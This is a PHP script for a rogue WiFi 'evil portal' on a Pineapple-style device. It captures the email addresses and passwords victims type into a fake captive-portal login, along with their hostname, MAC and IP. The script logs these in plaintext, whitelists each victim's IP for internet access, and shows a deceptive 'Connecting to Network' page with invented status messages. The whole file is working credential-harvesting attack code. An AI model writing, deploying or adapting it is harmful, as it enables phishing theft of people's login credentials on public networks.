<?php
/**
 * Standalone credential capture and whitelist handler
 * This gets copied to /www/goodportal/captiveportal/index.php by the payload
 * and processes captive portal form submissions.
 * 
 * This script was developed as an adapter to work with legacy Pineapple Evil Portals (ie https://github.com/kleo/evilportals)
 * 
 * filter_var() is not valid in this implementation of php
 */

// Configuration
define('LOG_FILE', '/tmp/goodportal_credentials.log');
define('WHITELIST_FILE', '/tmp/goodportal_whitelist.txt');
define('DEFAULT_REDIRECT', 'http://www.google.com');

// Only process POST requests with credentials
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
    
    // Capture submitted data
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    $hostname = isset($_POST['hostname']) ? trim($_POST['hostname']) : '';
    $mac = isset($_POST['mac']) ? trim($_POST['mac']) : '';
    $ip = isset($_POST['ip']) ? trim($_POST['ip']) : '';
    $target = isset($_POST['target']) ? trim($_POST['target']) : DEFAULT_REDIRECT;

    // Log credentials
    if (! empty($email) && !empty($password)) {
        $logEntry = "[" .  date('Y-m-d H:i:s') . " UTC]\n" .
                    "Email: {$email}\n" . 
                    "Password: {$password}\n" . 
                    "Hostname: {$hostname}\n" .
                    "MAC: {$mac}\n" .
                    "IP:  {$ip}\n" . 
                    "Target: {$target}\n" .
                    str_repeat('-', 50) . "\n\n";
        
        @file_put_contents(LOG_FILE, $logEntry, FILE_APPEND | LOCK_EX);
    }

    // Whitelist client IP address (more reliable than MAC)
    $clientIP = $_SERVER['REMOTE_ADDR'];
    if (!empty($clientIP) && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $clientIP)) {
        $currentWhitelist = @file_get_contents(WHITELIST_FILE);
        if ($currentWhitelist === false || strpos($currentWhitelist, $clientIP) === false) {
            @file_put_contents(WHITELIST_FILE, $clientIP . "\n", FILE_APPEND | LOCK_EX);
        }
    }

    // Validate and prepare target URL
    if (empty($target) || (strpos($target, 'http://') !== 0 && strpos($target, 'https://') !== 0)) {
        $target = DEFAULT_REDIRECT;
    }

    // Send HTML page with progress indicator and auto-retry
    // Handles the delay while whitelist monitor processes MAC and applies firewall rules
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Authenticating...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; color: white; }
        .container { text-align: center; padding: 40px; max-width: 500px; }
        .logo { font-size: 48px; margin-bottom: 20px; }
        h1 { font-size: 28px; margin-bottom: 10px; font-weight: 600; }
        .message { font-size: 16px; opacity: 0.9; margin-bottom: 30px; }
        .progress-container { background: rgba(255,255,255,0.2); border-radius: 20px; height: 8px; overflow: hidden; margin-bottom: 20px; }
        .progress-bar { height: 100%; background: white; border-radius: 20px; width: 0%; transition: width 0.3s ease; }
        .status { font-size: 14px; opacity: 0.8; }
        .spinner { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h1>Connecting to Network</h1>
        <p class="message">Configuring your internet access...</p>
        <div class="progress-container">
            <div class="progress-bar" id="progress"></div>
        </div>
        <p class="status" id="status">Initializing connection...</p>
    </div>
    <script>
        var target = ' . json_encode($target) . ';
        var checkInterval = 2000; // Check every 2 seconds
        var startTime = Date.now();
        var progressBar = document.getElementById("progress");
        var statusText = document.getElementById("status");
        var attempt = 0;
        
        var messages = [
            "Verifying credentials...",
            "Configuring firewall rules...",
            "Establishing secure connection...",
            "Negotiating network access...",
            "Finalizing configuration...",
            "Testing connection...",
            "Waiting for network availability..."
        ];
        
        function updateProgress() {
            var elapsed = Date.now() - startTime;
            // Progress slows down over time but never quite reaches 100%
            var progress = 100 * (1 - Math.exp(-elapsed / 30000));
            progressBar.style.width = Math.min(progress, 95) + "%";
            
            // Cycle through messages
            var messageIndex = Math.floor((elapsed / 8000)) % messages.length;
            statusText.textContent = messages[messageIndex];
        }
        
        function tryConnect() {
            attempt++;
            
            // Try loading a known-good endpoint to test connectivity
            var img = new Image();
            var timestamp = new Date().getTime();
            
            img.onload = function() {
                // Success! Connection is working
                progressBar.style.width = "100%";
                statusText.textContent = "Connected! Redirecting...";
                setTimeout(function() {
                    window.location.href = target;
                }, 500);
            };
            
            img.onerror = function() {
                // Still blocked - keep trying indefinitely
                setTimeout(tryConnect, checkInterval);
            };
            
            // This will load successfully if internet is available, fail if blocked
            img.src = "http://www.google.com/images/phd/px.gif?" + timestamp;
        }
        
        // Update progress bar smoothly
        setInterval(updateProgress, 200);
        
        // Start connection attempts after brief delay
        setTimeout(tryConnect, 1000);
    </script>
</body>
</html>';
    exit;
}

// If we get here, just redirect to Google (success page or direct GET request)
header("Location: " . DEFAULT_REDIRECT);
exit;
?>